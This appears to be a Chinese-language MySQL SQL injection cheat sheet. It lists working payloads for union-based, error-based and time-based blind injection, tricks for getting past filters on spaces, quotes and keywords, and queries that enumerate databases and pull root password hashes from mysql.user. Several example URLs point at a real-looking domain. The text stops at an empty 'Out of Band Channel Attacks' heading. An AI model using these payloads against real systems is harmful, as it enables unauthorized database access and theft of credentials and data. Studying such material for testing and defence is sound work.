## 一、查询数据库信息
mysql 5 联合查询；mysql 4 不支持联合查询。  
我们平时在注入中使用UNION查询一般都采用数字匹配字段的方式以达到select_expression的适用条件（即UNION后面查选的字段数量、字段数据类型都应该与最前面SELECT的一样），这是因为数字役属于几乎所有数据类型，因此可以匹配任何字段，HEX编码方式同样役属于几乎所有数据类型。  
可以使用很多单双引号，只要是成对出现的。  
``` 
SELECT * FROM Articles WHERE id = '1''';
SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
```
union select 不能用逗号时，可以用join执行联合查询，即先join 成一个大表，再select 这个大表   
`and+1=2+union+SELECT+*+FROM+(select+version())+as+a+join+(select+22)+as+b+join+(select+33)+as+c%23`  
下面的符号可以用来注释语句：  
&#35; Hash 语法（注意浏览器访问时需要编码成%23，否则被当作锚点起始）  
/*  C-style 语法  
-- - SQL 语法  
--+ Mysql语法  
;%00 空字节  
` 反引号  
Mysql中，`/*! SQL 语句 */` 这种格式里面的 SQL 语句会当正常的语句一样被解析。  
如果在!之后是一串数字(这串数字就是 mysql 数据库的版本号)， 如：`/*! 12345 SQL 语句 */`  
当版本号大于等于该数字，SQL 语句则执行，否则就不执行。  
`UNION SELECT /*!50000 5,null;%00*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+`  
`SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);`  
允许的字符:  
09 Horizontal Tab  
0A New Line  
0B Vertical Tab  
0C New Page  
0D Carriage Return  
A0 Non-breaking Space  
20 Space  
例子：`'and%0A%09UNION%0CSELECT%A0NULL%20%23`  
括号也可以用来绕过过滤空格的情况：  
28 (  
29 )  
例子：`UNION(SELECT(column)FROM(table))`  
AND或OR后面可以跟的字符:  
20 Space  
2B +  
2D -  
7E ~  
21 !  
40 @  
例子：`SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))`  
dual 是一个虚拟表，可以用来做测试。  
注意：  
where a_exp or b_exp 中如果 a_exp is true 是不会计算 b_exp 的，如果 a_exp is false，那 b_exp 执行且执行的次数跟表的条目有关，即如果 b_exp 是 sleep(2)，而表有3个条目，将睡眠6s 后返回。    
where a_exp and b_exp 中如果 a_exp is false 是不会计算 b_exp 的，如果 a_exp is true，那 b_exp 执行且执行的次数跟表的条目有关，即如果 b_exp 是 sleep(2)，而表有3个条目，将睡眠6s 后返回。     
测试时尽量不用 or 1=1, 如果sql 语句是执行update 或者delete，容易造成数据变更。 
在没有加() 等其他符号时， and 和 or 一起出现先计算 and，为了绕过对 and / or 的过滤，可以使用 rlike 等关键字，比如 `where 11=11 rlike sleep(10)#`。     
`?id=1%27%20AnD%201=2%20OR%20if(now()%3dsysdate()%2csleep(3)%2c0)%20And%20%271%27=%271`  
查询information_schema(>=5.0 才存在,mysql5.0以下需要字典猜表)、mysql 数据库的信息(需要root权限，表名、列名、对应权限等)  
mysql.user、information_schema.schemata、information_schema.tables、information_schema.columns、  information_schema.user_privileges  
`SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)`  
使用CONCAT()时，任何一个参数为null，将返回null， 推荐使用CONCAT_WS()。  
CONCAT_WS() 函数第一个参数表示用哪个字符间隔所查询的结果。  
`SELECT database();`  
`SELECT group_concat(schema_name) FROM information_schema.schemata;`  
`SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)`
`UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;--` MySQL 4版本时用version=9，MySQL 5版本时用version=10  
`UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename';`  
`union select concat(grantee,0x3a,privilege_type,0x3a,is_grantable) from information_schema.user_privileges`  //权限    
`SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';`
查询版本，用户，操作系统等  
``` 
http://www.qq.com/1.php?id=-1 union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14
http://www.qq.com/1.php?id=-1 union select 
1,2,3,4,group_concat(version(),0x3a,database(),0x3a,user()),6,7,8,9,10,11,12,13,14
http://www.qq.com/1.php?id=-1 union select 1,2,3,4,@@datadir,6,7,8,9,10,11,12,13,14
http://www.qq.com/1.php?id=-1 union all select 1,unhex(hex(@@version)),3/*
http://www.qq.com/1.php?id=5 and substring(@@version,1,1)=4
``` 
如果MySQL的版本是4，这应该返回TRUE.   
用5替换4，并且，如果返回的查询匹配则版本为5   
```  
http://www.qq.com/1.php?id=5 and substring(@@version,1,1)=5
http://www.qq.com/1.php?id=5 AND MID(VERSION(),1,1) = '5';
http://www.qq.com/1.php?id=5 AND ord(MID(VERSION(),1,1)) = 53;
```
---------------------------------------------------------------------------------------------------------
### 内置变量列表  
@@version  VERSION()  @@GLOBAL.VERSION 版本   
@@datadir 路径  
@@basedir  
@@version_compile_os  
@@have_openssl 如果mysqld支持客户端/服务器协议的SSL(加密)则为YES  
@@version_compile_os 判断系统类型  
@@max_allowed_packet 包或任何生成的/中间字符串的最大大小  
@@max_user_connections MySQL账户允许的最大同时连接数,0表示没限制   
@@skip_networking 如果服务器只允许本地(非TCP/IP)连接,该值为ON  
@@table_type 默认表类型(存储引擎)  
@@basedir MySQL安装基准目录  
@@character_set_database 默认数据库使用的字符集  
@@datadir 数据库存储的地方  
@@expire_logs_days 二进制日志自动删除的天数,默认是0,表示"没有自动删除"  
@@group_concat_max_len 允许group_concat()函数结果的最大长度  
@@log_error 错误日志的位置  
@@lower_case_file_system 该变量说明是否数据目录所在的文件系统对文件名的大小写敏感.ON说明对文件名的大小写不敏感,OFF表示敏感  
@@lower_case_table_names 如果设置为1,表名用小写保存到硬盘上,并且表名比较时不对大小写敏感.如果设置为2,按照指定的保存表名,但按照小写来比较  
@@plugin_dir 插件目录的路径  
@@tmpdir 保存临时文件和临时表的目录  
@@tmp_table_size 如果内存内的临时表超过该值,MySQL自动将它转换为硬盘上的MyISAM表  
@@sql_mode 当前服务器的sql模式  
@@tx_isolation 默认事务隔离级别.默认值为REPEATABLE-READ  
@@Connections 连接mysql数据库服务器的次数(不管成功还是失败)  
@@max_write_lock_count 最大写锁数量  
@@old_passwords 是否启用mysql323加密方式(就是mysql用户密码的hash是16位的)  
@@Uptime 服务器已经运行的时间   
通过id=instr(@@global.version,1)来获取global变量。@@global包含很多敏感信息，过滤了ascii,substr函数，仍可用instr来盲注。  
-------------------------------------------------------------------------------------------------------
### 可回显注入
从information_schema.columns可以查table_schema、table_name、column_name  
库  
`union select unhex(hex(group_concat(schema_name))) from information_schema.schemata`  
表  
`union select unhex(hex(group_concat(table_name))) from information_schema.tables where table_schema=0x(数据库名对应的十六进制）`  
字段  
`union select unhex(hex(group_concat(column_name))) from information_schema.columns where table_schema=0x(数据库名对应的十六进制) and table_name=0x(表名对应的十六进制）`  
查询数据（实例）  
`union select 1,2,3,4,concat(username,0x3a,password),6 from admin.users`  //获取到表、字段后，就可以查询所需信息了，如查询users库的admin表的用户名和密码  
插入数据（不用引号）  
```
INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72), 
char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72), 0x64)  
```
insert/update/delete 语句中注入  
`or updatexml(1,concat(0x7e,(version())),0) or`  
e.g   
INSERT INTO users (id, username, password) VALUES (2,'r00tgrok' or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or '', 'ohmygod_is_r00tgrok');  
`or extractvalue(1,concat(0x7e,database())) or`  
e.g   
UPDATE users SET password='Nicky' or extractvalue(1,concat(0x7e,database())) or '' WHERE id=2 and username='Pseudo_Z';  
DELETE FROM users WHERE id=1 or extractvalue(1,coat(0x7e,database())) or '';   
------------------------------------------------------------------------------------------------------------
### 盲注查询
#### BENCHMARK() (M)
Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!  
BENCHMARK(howmanytimes, do this)    
Real World Samples    
Are we root ? woot!     
`IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`  
Check Table exist in MySQL   
`IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`  
#### sleep(seconds) (M)
Sleep for supplied seconds.  
`SELECT sleep(10); `  
Sleep 10 seconds.  
`and%20(select*from(select(sleep(10)))a)--`  
注意 sleep/benchmark 函数执行完返回值是 0，故 if(now()=sysdate(),sleep(duration),0) 返回值肯定是0。    
#### More Timing in MySQL
`select benchmark( 500000, sha1( 'test' ) );`  
`query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`  
`select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); `  
Enumeration data, Guessed Brute Force   
`select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );`  
```
-if(now()=sysdate(),sleep(duration),0)/*'XOR(if(now()=sysdate(),sleep(duration),0))OR'"XOR(if(now()=
sysdate(),sleep(duration),0))OR"*/
```    
上面这条payload 在参数是 数字或者字符串（单双引号）的情形下都是适用的。    
```
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse(extractvalue(rand(),
concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1)))),1)  
```
上面这条用于 order by limit 之后的timing注入，注意这里不能用sleep函数。  
#### Out of Band Channel Attacks